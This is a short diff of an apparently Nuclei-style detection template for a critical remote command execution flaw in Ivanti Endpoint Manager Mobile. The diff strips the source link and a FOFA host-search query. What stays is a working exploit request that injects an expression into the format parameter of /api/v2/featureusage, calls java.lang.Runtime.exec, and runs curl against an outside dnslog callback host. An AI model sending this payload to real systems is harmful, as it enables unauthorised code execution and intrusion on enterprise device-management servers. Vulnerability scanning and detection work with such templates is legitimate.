@@ -3,12 +3,8 @@ info:
   name: IvantiEndpointManagerMobile存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zoc00ztds0sxksqa'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zoc00ztds0sxksqa
-    fofa: icon_hash="362091310"
 http:
 - raw:
   - 'GET /api/v2/featureusage?adminDeviceSpaceId=131&format=%24%7b''''.getClass().forName(''java.lang.Runtime'').getMethod(''getRuntime'').invoke(''''.getClass().forName(''java.lang.Runtime'')).exec(''curl%20test2.lpxk4q.dnslog.cn'')%7d HTTP/1.1
